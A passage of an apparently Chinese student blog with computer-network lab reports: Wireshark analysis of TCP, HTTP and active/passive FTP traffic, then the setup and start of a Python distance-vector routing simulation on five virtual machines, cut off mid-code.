<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">wget ischoolgu.xmu.edu.cn –-no-http-keep-alive</span><br></pre></td></tr></table></figure></div>
<p>抓到如下报文</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191225175506916.png" alt="image-20191225175506916"></p>
<h4 id="1°分析报文"><a href="#1°分析报文" class="headerlink" title="1°分析报文"></a>1°分析报文</h4><p>选取一TCP报文</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/20191225180610.png" alt="20191225180610"></p>
<p>TCP首部格式如下</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/20180324192146298.png" alt="img"></p>
<p>图中：<br>Source Port:源端口，占16位，图中为62960<br> Destination Port:目的端口，占16位，图中为678<br>[Stream index]: 流索引，流索引是内部Wireshark映射到：<strong>[IP地址A，TCP端口A，IP地址B，TCP端口B]</strong>，具有相同tcp.stream值的所有数据包对于这些字段应具有相同的值（尽管src/dest将针对A-&gt; B和B-&gt; A数据包进行切换），在Wireshark中的“统计信息/对话/ TCP”选项卡以显示这些流的摘要<br>[TCP Segment Len]:TCP报文段数据部分长度，点击这一项，其指向和Header Length同一字段，这是因为Wireshark根据IP层的数据总长度233减去IP首部长度20再减去TCP首部长度20计算得来的长度193字节<br>Sequence number(relative sequence number)：序号，占16位，TCP报文每个字节都按顺序编号，这个序号指的是本报文段所发送数据的第一个字节序号，图中为168<br>[Next sequence number(relative sequence number)]:下一个序号，Wireshark根据Sequence number+TCP Segment Len=168+193=361算出来的结果，<br>Acknowledgment number(relative ack number):确认号，占16位，是期望收到对方下一个报文段的第一个数据字节的序号，<strong>若确认号为= N，则表明：到序号N-1为止的所有数据都已正确收到</strong>。图中为108<br>Header Length: 20 bytes:数据偏移，它指出TCP报文段的数据起始处距离TCP报文段的起始处有多远，这个字段实际上是指出<strong>TCP报文段的首部长度</strong>，占4位，<strong>其单位为32位字（4字节）</strong>图中为20bytes<br>Flags: 控制位，用来说明本报文段的性质，占12位，其中前6位是<strong>保留字段</strong>，后面6位代表以下6个控制位：<br>&emsp;紧急URG（URGent）：当URG=1时，表明紧急指针字段有效。它告诉系统此报文段中有紧急数据，应尽快发送（相当于高优先级的数据），而不要按原来的排队顺序来传送。例如，已经发送了很长的一个程序要在远地的主机上运行。但后来发现了一些问题，需要取消该程序的运行，因此用户从键盘发出中断命令。如果不使用紧急数据，那么这两个字符将存储在接收TCP的缓存末尾。只有在所有的数据被处理完毕后这两个字符才被交付接收方的应用进程。这样做就浪费了很多时间。<br>当URG置为1时，发送应用进程就告诉发送方的TCP有紧急数据要传送。于是发送方TCP就把紧急数据插入到本报文段数据的最前面，而在紧急数据后面的数据仍然是普通数据。这时要与首部中紧急指针（Urgent Pointer）字段配合使用，图中为0<br>&emsp;确认ACK（ACKnowledgment）:仅当ACK = 1时确认号字段才有效，当ACK = 0时确认号无效。TCP规定，在连接建立后所有的传送的报文段都必须把ACK置为1。图中为1<br>&emsp;推送 PSH（PuSH）:当两个应用进程进行交互式的通信时，有时在一端的应用进程希望在键入一个命令后立即就能收到对方的响应。在这种情况下，TCP就可以使用推送（push）操作。这时，发送方TCP把PSH置为1，并立即创建一个报文段发送出去。接收方TCP收到PSH=1的报文段，就尽快地（即“推送”向前）交付接收应用进程。而不用再等到整个缓存都填满了后再向上交付。图中为1<br>&emsp;复位RST（ReSeT）:当RST=1时，表名TCP连接中出现了严重错误（如由于主机崩溃或其他原因），必须释放连接，然后再重新建立传输连接。RST置为1还用来拒绝一个非法的报文段或拒绝打开一个连接。图中为0<br>&emsp;同步SYN（SYNchronization）       在连接建立时用来同步序号。当SYN=1而ACK=0时，表明这是一个连接请求报文段。对方若同意建立连接，则应在响应的报文段中使SYN=1和ACK=1，因此SYN置为1就表示这是一个连接请求或连接接受报文。图中为0<br>&emsp;终止FIN（FINis，意思是“完”“终”）          用来释放一个连接。当FIN=1时，表明此报文段的发送发的数据已发送完毕，并要求释放运输连接。图中为0<br>Window size value:窗口大小，占2字节，<strong>窗口指的是发送本报文段的一方的接受窗口（而不是自己的发送窗口）</strong>，以字节为单位，<strong>窗口值作为接收方让发送方设置其发送窗口的依据</strong>。图中为256<br>[Calculated window size]:窗口实际可用大小，由Window size value乘以Window size scaling factor计算而来图中为65536<br>[Window size scaling factor]:这是一个放大倍数，图中为256，实际上用16位表示窗口大小已经满足不了现在的需求。在TCP三次握手过程中，可以通过<strong>SYN</strong>包开启TCP选项Window Size Scaling，设计出这个选项是因为如今的带宽已经大规模提升，千兆到桌面也是一件常事儿，因此，65535长度的窗口大小已经显得有些小了，为了突破这个限制，便有了Window Size Scaling选项</p>
<p>打开一个另一个SNK报文，在<strong>选项</strong>发现如下字段:</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191225202839967.png" alt="image-20191225202839967"></p>
<p>可以看到这个字段的值为8，也就是要将Window Size的值左移8位，即乘以128，因此，在上面中我们看到window size值是256，但是真正选用的值却是65536(256*256)。<br>Checksum: 校验和，占2字节。检验和字段检验的范围包括首部和数据这两部分。和UDP用户数据报一样，在计算检验和时，要在TCP报文段的前面加上12字节的伪首部。伪首部的格式和UDP用户数据报的伪首部一样。但应把伪首部第4个字段中的17改为6（TCP的协议号是6）；把第5字段中的UDP中的长度改为TCP长度。接收方收到此报文段后，仍要加上这个伪首部来计算检验和。若使用TPv6,则相应的伪首部也要改变。图中为0x843f [unverified]未验证状态<br>Urgent pointer:  紧急指针，占2字节。紧急指针仅在URG=1时才有意义，它指出本报文段中的紧急数据的字节数（紧急数据结束后就是普通数据） 。因此，在紧急指针指出了紧急数据的末尾在报文段中的位置。当所有紧急数据都处理完时，TCP就告诉应用程序恢复到正常操作。值得注意的是，即使窗口为0时也可以发送紧急数据，图中为0<br>Options:选项,长度可变，最长可达4字节。包括最大报文段长度MSS、窗口扩大选项、时间戳选项等。当没有使用“选项”时，TCP的首部长度是20字节。该TCP首部没有选项字段，因此仅有20字节</p>
<h4 id="2°画出TCP的流图"><a href="#2°画出TCP的流图" class="headerlink" title="2°画出TCP的流图"></a>2°画出TCP的流图</h4><p>利用右键追踪TCP流定位到 <a href="http://ischoolgu.xmu.edu.cn/">http://ischoolgu.xmu.edu.cn/</a> 网站html文件所在TCP流</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191225205618179.png" alt="image-20191225205618179"></p>
<p>根据流信息画出流程图</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191225210818958.png" alt="image-20191225210818958"></p>
<p>[TCP segment of a reassembled PDU]是Wireshark分析了其上层的HTTP协议而给出的摘要，为了便于分析，将其还原为可以直接读取的TCP信息，配置Wireshark不支持HTTP协议解析 </p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227113929953.png" alt="image-20191227113929953" style="zoom:67%;"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227114043056.png" alt="image-20191227114043056" style="zoom:67%;"></p>
<p>转变为如下图 </p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227114625453.png" alt="image-20191227114625453"></p>
<div id="sequence-0"></div>

<h3 id="任务要求2"><a href="#任务要求2" class="headerlink" title="任务要求2"></a>任务要求2</h3><p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191225171410342.png" alt="image-20191225171410342"></p>
<h3 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h3><p>定位所在流序号</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191226155333151.png" alt="image-20191226155333151"></p>
<p>得到以下图</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/20191226160219.png" alt="20191226160219"></p>
<p>依然对[TCP segment of a reassembled PDU]进行还原，得到以下图</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227114204908.png" alt="image-20191227114204908"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191228224704565.png" alt="image-20191228224704565" style="zoom: 200%;"></p>
<div style="page-break-after: always;"></div>

<h2 id="任务3：-HTTP协议分析"><a href="#任务3：-HTTP协议分析" class="headerlink" title="任务3： HTTP协议分析"></a>任务3： HTTP协议分析</h2><h3 id="任务要求-1"><a href="#任务要求-1" class="headerlink" title="任务要求"></a>任务要求</h3><p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227155942568.png" alt="image-20191227155942568"></p>
<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>（1）</p>
<p>访问<a href="http://stu.xmu.edu.cn/过滤HTTP报文得到如下图">http://stu.xmu.edu.cn/过滤HTTP报文得到如下图</a></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227215718717.png" alt="image-20191227215718717"></p>
<p>分析其中一对HTTP请求/响应报文</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227220524272.png" alt="image-20191227220524272"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227220620279.png" alt="image-20191227220620279"></p>
<p>HTTP请求报文格式如下：</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/headImg.action" alt="img"></p>
<p>HTTP响应报文格式如下：</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/headImg.action" alt="img"></p>
<p>HTTP请求报文首部：<br>GET /coremail/common/assets/login/js/blurImg_worker.js HTTP/1.1\r\n： GET 为请求方式，后面跟请求的内容及协议版本<br>Request Method: GET 请求方式<br>Request URI: /coremail/common/assets/login/js/blurImg_worker.js 请求内容<br>Request Version: HTTP/1.1 协议的版本<br>Host: stu.xmu.edu.cn\r\n 请求的主机名<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\r\n 发送请求的操作系统、及浏览器信息<br>Accept:*/*\r\n 客户端可识别的内容类型列表，用于指定客户端接受了哪些类型的信息<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n 浏览器所支持的语言类型<br>Accept-Encoding: gzip, deflate\r\n 客户端可识别的数据编码<br>Connection: close\r\n 客户端与服务端指定的请求，响应有关选项<br>Referer: <a href="http://stu.xmu.edu.cn/coremail/index.jsp?cus=1\r\n">http://stu.xmu.edu.cn/coremail/index.jsp?cus=1\r\n</a> 客户端可识别的内容类型列表，用于指定客户端接受哪些类型的信息<br>Cookie: 类型为“<strong>小型文本文件</strong>”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息</p>
<p>HTTP响应报文首部：<br>HTTP/1.1 200 OK\r\n 状态行，200表示客户端请求成功<br>Request Version: HTTP/1.1 协议版本<br>Status Code: 200 状态码<br>Response Phrase: OK 响应短语<br>Server: nginx\r\n 服务器信息<br>Date: Fri, 27 Dec 2019 13:16:16 GMT\r\n 响应时间<br>Content-Type: application/javascript\r\n 告诉客户端实际返回的内容类型<br>Transfer-Encoding: chunked\r\n 消息主题的大小<br>Connection: close\r\n 连接状态<br>X-Protected-By: OpenRASP\r\n<br>X-Request-ID: 1040fe080fa5424da40cc11f29d4acec\r\n<br>ETag: W/“4603-1472555014000”\r\n 资源的特定版本的标识符<br>Last-Modified: Tue, 30 Aug 2016 11:03:34 GMT\r\n请求资源的最后修改时间<br>Content-Encoding: gzip\r\n 响应内容编码<br>HTTP chunked response 响应内容<br>Content-encoded entity body (gzip): 1560 bytes -&gt; 4603 bytes 编码对应主体<br>File Data: 4603 bytes 文件数据大小<br>Media Type：文件类型</p>
<p>（2）<br>在首选项添加显示端口</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227234729105.png" alt="image-20191227234729105"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227234858198.png" alt="image-20191227234858198"></p>
<p>可知这次的访问总共生成10个TCP流，传输双方的端口号和内容均可以从上图看出，可以发现远程主机的端口号均是80</p>
<h2 id="任务4：FTP分析"><a href="#任务4：FTP分析" class="headerlink" title="任务4：FTP分析"></a>任务4：FTP分析</h2><h3 id="任务要求-2"><a href="#任务要求-2" class="headerlink" title="任务要求"></a>任务要求</h3><p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227235748753.png" alt="image-20191227235748753"></p>
<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>使用如下命令进入访问该ftp</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">ftp</span><br><span class="line">o ftp.rfc-editor.org</span><br><span class="line">ftp</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191228000747868.png" alt="image-20191228000747868"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">cd legal</span><br><span class="line">get rfc811.txt</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191228001209094.png" alt="image-20191228001209094"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191228001757975.png" alt="image-20191228001757975"></p>
<p>Linux Ftp命令下默认为被动模式，更改为主动的方法：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">ftp&gt;</span><span class="bash">passive</span></span><br></pre></td></tr></table></figure></div>
<p>但是这边有个巨坑！之后发现主动完全无法建立连接</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191228024308063.png" alt="image-20191228024308063"></p>
<p>捣鼓许久才知道需关闭windows防火墙</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191228025523929.png" alt="image-20191228025523929"></p>
<p>便成功抓到FTP PORT模式下的数据包</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191228024555915.png" alt="image-20191228024555915"></p>
<p>现比较两种模式</p>
<p>被动模式</p>
<div id="sequence-1"></div>

<p>从上面sequence图中可以看到，被动模式是FTP服务器返回数据传输需要的端口，FTP客户端去连接FTP服务端。绝大部分的互联网应用(比如Web/Http)，都是客户端向服务端发起连接。换句话说，绝大部分互联网应用都是被动模式。</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191228101422236.png" alt="image-20191228101422236"></p>
<p>从上图可以看到，服务端(4.31.198.49)返回给客户端(192.168.2.29)数据端口(117,228)=117*256+128=30080,然后用这个端口进行数据传输</p>
<p>主动模式</p>
<div id="sequence-2"></div>

<p>从sequence图中可以看到，主动模式是FTP客户端向FTP服务器发送数据传输需要的端口，FTP服务端去连接FTP客户端的端口，与被动模式刚好相反。值得注意的是，需要注意的是，被动模式和主动模式的登录过程，都是FTP客户端去连接FTP服务器。</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191228101703372.png" alt="image-20191228101703372"></p>
<p>从上图可以看到，返回给客户端(192.168.2.29)主动将数据端口(195,76)=195<em>256+76=49996发给服务端(4.31.198.49),而服务端启用固定端口<em>*20</em></em>和客户端的这个端口进行数据传输</p>
<p>因此从上面可以总结出：主动模式对便于FTP服务器的管理，不便于对客户端进行管理。因为FTP服务器企图与客户端的高位随机端口建立连接，而这个端口很有可能被客户端的防火墙所阻塞，从上面笔者将linux虚拟机外部的windows防火墙关掉才可使用FTP PORT模式可以看出。被动模式对FTP便于对客户端进行管理，不便于对服务器端进行管理。因为客户端要与服务器端建立两个连接，其中一个连到一个高位随机端口，而这个端口很有可能被服务器端的防火墙阻塞掉。</p>
<p>使用Windows下的firefox下载rfc811.txt</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191228024738405.png" alt="image-20191228024738405"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191228112057148.png" alt="image-20191228112057148"></p>
<p>对比下图FTP被动模式，可以看出，使用web浏览器下载，其默认使用匿名(anonymous)登陆，密码自动使用mozilla@example.com，而实践证明用linux FTP在未开启匿名登陆方式时不能进行匿名登陆，然后会发送编码方式，使用被动模式进行传输，但在下载时，会下载该文件的属性（生成时间），这是与Windows的NTFS文件系统相匹配的。</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191228113623047.png" alt="image-20191228113623047"></p>
<div style="page-break-after: always;"></div>

<h1 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h1><pre><code>此次实验我进一步掌握了wireshark的各种使用技巧，分析了应用层的DNS、HTTP、FTP协议，对应用层有更深刻的认识和理解，并且学到了课本上所未提及到的知识。在切换FTP port模式时，我遇到了很大的困难，无论如何修改虚拟机配置都不能建立连接，最后了解主动模式和被动模式的区别，方知问题可能出在外部的Windows上，最后成功解决问题。学习就是不断经过思考和实践来克服困难的过程，知其难为而勉力为之，方为正道。
</code></pre><p><script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.27/webfontloader.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/snap.svg/0.4.1/snap.svg-min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.8.3/underscore-min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/js-sequence-diagrams/1.0.6/sequence-diagram-min.js"></script><textarea id="sequence-0-code" style="display: none">participant Client
participant Server
note over Client,Server:OPEN
Client -->> Server: <SYN>Seq=0 Win=14600 Len=0
Client -->> Server: [TCP Out-Of-Order]<SYN>Seq=0 Win=14600 Len=0
Server -->> Client: <SYN,ACK>Seq=0 Ack=1 Win=14600 Len=0
Client -->> Server: <ACK>Seq=1 Ack=1 Win=14600 Len=0
Client -->> Server: [TCP Dup ACK 104#1]<ACK>Seq=1 Ack=1 Win=14600 Len=0 
note over Client,Server:ESTABLISHED
Client->Server: <PSH,ACK>Seq=1 Ack=1 Win=14600 Len=94
Client->Server: [TCP Restransmission]<ACK>Seq=1 Ack=1 Win=14600 Len=94 
Server->Client: <ACK>Seq=1 Ack=95 Win=14600 Len=0
Server->Client: <ACK>Seq=1 Ack=95 Win=14600 Len=1460
Server->Client: <ACK>Seq=1461 Ack=95 Win=14600 Len=1460
Client->Server: <ACK>Seq=95 Ack=1461 Win=17520 Len=0
Client->Server: [TCP Dup ACK 111#1]<ACK>Seq=95 Ack=1461 Win=17520 Len=0 
Client->Server: <ACK>Seq=95 Ack=2921 Win=20440 Len=0
Client->Server: [TCP Dup ACK 113#1]<ACK>Seq=95 Ack=2921 Win=20440 Len=0 
Server->Client: <PSH,ACK>Seq=2921 Ack=95 Win=14600 Len=865
note over Client,Server:CLOSE
Server-->>Client: <FIN,ACK>Seq=3786 Ack=95 Win=14600 Len=0
Client-->>Server: <ACK>Seq=95 Ack=3786 Win=23360 Len=0
Client-->>Server: [TCP Dup ACK 117#1]<ACK>Seq=95 Ack=3786 Win=23360 Len=0 
Client-->>Server: <FIN,ACK>Seq=95 Ack=3787 Win=23360 Len=0
Client-->>Server: [TCP Out-Of-Order]<FIN,ACK>Seq=95 Ack=2921 Win=23360 Len=0 
Server-->>Client: <ACK>Seq=3787 Ack=2921 Win=14600 Len=0</ACK></FIN,ACK></FIN,ACK></ACK></ACK></FIN,ACK></PSH,ACK></ACK></ACK></ACK></ACK></ACK></ACK></ACK></ACK></PSH,ACK></ACK></ACK></SYN,ACK></SYN></SYN></textarea><textarea id="sequence-0-options" style="display: none">{"theme":"simple","scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("sequence-0-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("sequence-0-options").value));  var diagram = Diagram.parse(code);  diagram.drawSVG("sequence-0", options);</script><textarea id="sequence-1-code" style="display: none">participant FTP客户端
participant FTP服务端
FTP客户端 --> FTP服务端: 用户登录
FTP服务端 --> FTP客户端: 登录成功
FTP客户端 --> FTP服务端: PASV
FTP服务端 --> FTP客户端: 返回服务器(IP,新端口)
FTP客户端 --> FTP服务端: 新创建数据传输TCP连接[ip,新端口]
FTP客户端 --> FTP服务端: STOR文件名
note over FTP客户端,FTP服务端: 在新建立的数据连接上传输</textarea><textarea id="sequence-1-options" style="display: none">{"theme":"simple","scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("sequence-1-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("sequence-1-options").value));  var diagram = Diagram.parse(code);  diagram.drawSVG("sequence-1", options);</script><textarea id="sequence-2-code" style="display: none">participant FTP客户端
participant FTP服务端
FTP客户端 --> FTP服务端: 用户登录
FTP服务端 --> FTP客户端: 登录成功
FTP客户端 --> FTP服务端: PORT 客户端(ip,端口)
FTP服务端 --> FTP客户端: 新创建数据传输TCP连接[ip,新端口]
FTP客户端 --> FTP服务端: STOR文件名
note over FTP客户端,FTP服务端: 在新建立的数据连接上传输</textarea><textarea id="sequence-2-options" style="display: none">{"theme":"simple","scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("sequence-2-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("sequence-2-options").value));  var diagram = Diagram.parse(code);  diagram.drawSVG("sequence-2", options);</script></p>
]]></content>
      <categories>
        <category>计算机网络通信实验</category>
      </categories>
  </entry>
  <entry>
    <title>计网实验——路由算法实验</title>
    <url>/posts/ef2e418b/</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>目的：学习和掌握距离向量算法<br>内容：编程实现并分析以下过程</p>
<ul>
<li>模拟路由收敛</li>
<li>模拟拓扑变化</li>
<li>制造路由回路</li>
<li>抑制路由回路<a id="more"></a></li>
</ul>
<h1 id="实验内容与分析"><a href="#实验内容与分析" class="headerlink" title="实验内容与分析"></a>实验内容与分析</h1><p>实验环境</p>
<p>CentOS 7.7 + GCC 4.8.5<br>Win10+Python3.6</p>
<h2 id="实验环境配置"><a href="#实验环境配置" class="headerlink" title="实验环境配置"></a>实验环境配置</h2><p>本次实验使用五台虚拟机模拟五个路由器，网络连接均为NAT模式，端口统一用20000，五个路由器的名称及对应IP如下：<br>&emsp;A : 192.168.126.65<br>&emsp;B : 192.168.126.66<br>&emsp;C : 192.168.126.67<br>&emsp;D : 192.168.126.68<br>&emsp;E : 192.168.126.69</p>
<p>网络配置方法如下：<br>以路由器A为例</p>
<p>在终端输入如下命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ZSH"><figure class="iseeu highlight /zsh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/sysconfig/network-scripts/</span><br><span class="line">ls</span><br></pre></td></tr></table></figure></div>
<p>可以看到第一个网卡ifcfg-ens33</p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217211941456-1576589115960.png" alt="image-20191217211941456" style="zoom:80%;"></p>
<p>用nano或vim对其进行编辑</p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217213615538.png" alt="image-20191217213615538" style="zoom:80%;"></p>
<p>注释BOOTPROTO=dhcp,将其设置为静态IP</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ZSH"><figure class="iseeu highlight /zsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#BOOTPROTO=dhcp</span></span><br><span class="line">BOOTPROTO=static</span><br></pre></td></tr></table></figure></div>
<p>并在后面添加IP配置信息</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">GATEWAY&#x3D;192.168.126.2</span><br><span class="line">IPADDR&#x3D;192.168.126.65</span><br><span class="line">NETMASK&#x3D;255.255.255.0</span><br><span class="line">DNS1&#x3D;114.114.114.114</span><br><span class="line">DNS2&#x3D;8.8.8.8</span><br><span class="line">ARPCHECK&#x3D;no</span><br></pre></td></tr></table></figure></div>
<p>GATEWAY和NETMASK可以在VMWare的虚拟网络编辑器查看</p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217214851722.png" alt="image-20191217214851722" style="zoom: 67%;"></p>
<p>设置完成后重启网络服务</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ZSH"><figure class="iseeu highlight /zsh"><table><tr><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></table></figure></div>
<p>利用ifconfig可以看到网络地址设置成功</p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217215846110.png" alt="image-20191217215846110" style="zoom: 50%;"></p>
<p>同理依次设置其他4个虚拟机IP即可</p>
<h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217210336740.png" alt="image-20191217210336740"></p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217210359141.png" alt="image-20191217210359141"></p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217210435671.png" alt="image-20191217210435671"></p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217210624528.png" alt="image-20191217210624528"></p>
<div style="page-break-after: always;"></div>

<h2 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h2><h3 id="DVroute-py"><a href="#DVroute-py" class="headerlink" title="DVroute.py"></a>DVroute.py</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys, time, socket, copy, json</span><br><span class="line"><span class="keyword">import</span> prettytable <span class="keyword">as</span> pt</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'mingkwind'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">addr2rName字典为建立地址和路由器名的一一对应</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">addr2rName = &#123;&#125;</span><br><span class="line">addr2rName[(<span class="string">"192.168.126.65"</span>, <span class="number">20000</span>)] = <span class="string">'A'</span></span><br><span class="line">addr2rName[(<span class="string">"192.168.126.66"</span>, <span class="number">20000</span>)] = <span class="string">'B'</span></span><br><span class="line">addr2rName[(<span class="string">"192.168.126.67"</span>, <span class="number">20000</span>)] = <span class="string">'C'</span></span><br><span class="line">addr2rName[(<span class="string">"192.168.126.68"</span>, <span class="number">20000</span>)] = <span class="string">'D'</span></span><br><span class="line">addr2rName[(<span class="string">"192.168.126.69"</span>, <span class="number">20000</span>)] = <span class="string">'E'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Router</span><span class="params">(socket.socket)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    这是一个继承socket.socket的类，用于实现路由器功能：</span></span><br><span class="line"><span class="string">    该路由器可用于有更新定时器（update）下DV路由算法，模拟路由表收敛的过程，</span></span><br><span class="line"><span class="string">    对于无穷计数和路由回路，采用逆向毒化（poison reverse）加以解决。</span></span><br><span class="line"><span class="string">    对于链路变化过程，可模拟linkChange（邻居链路建立和距离改变）</span></span><br><span class="line"><span class="string">    和linkDown（邻居链路断开）功能</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, router_address, neighbor, addr2rName, MaxHop=<span class="number">15</span>)</span>:</span></span><br><span class="line">        <span class="comment">#用父类socket.socket的初始化方法来初始化继承的属性</span></span><br><span class="line">        <span class="comment">#初始化包含五个参数：</span></span><br><span class="line">        <span class="comment">#router_address：路由器地址，形式为（ip,port）</span></span><br><span class="line">        <span class="comment">#neighbor：邻居路由器，类型为字典，(key,value) = (rName, &#123;addr, cost&#125;)</span></span><br><span class="line">        <span class="comment">#addr2rName:字典为建立地址和路由器名的一一对应</span></span><br><span class="line">        <span class="comment">#MaxHop:最大跳数，缺省值为15，MaxHop+1(16)表示不可达</span></span><br><span class="line">        super(Router, self).__init__(</span><br><span class="line">            socket.AF_INET,</span><br><span class="line">            socket.SOCK_DGRAM)  <span class="comment">#该路由器采用UDP传输，socket.SOCK_DGRAM用于UDP协议</span></span><br><span class="line">        self.__addr = router_address</span><br><span class="line">        self.__neighbor = neighbor</span><br><span class="line">        self.__addr2rName = addr2rName</span><br><span class="line">        self.__MaxHop = MaxHop</span><br><span class="line"></span><br><span class="line">        self.__name = self.__addr2rName[self.__addr]  <span class="comment">#所创建的路由器名</span></span><br><span class="line">        self.__rName2addr = &#123;&#125;  <span class="comment">#字典建立addr2rName的反向查找</span></span><br><span class="line">        <span class="keyword">for</span> addr <span class="keyword">in</span> self.__addr2rName:</span><br><span class="line">            self.__rName2addr[self.__addr2rName[addr]] = addr</span><br><span class="line">        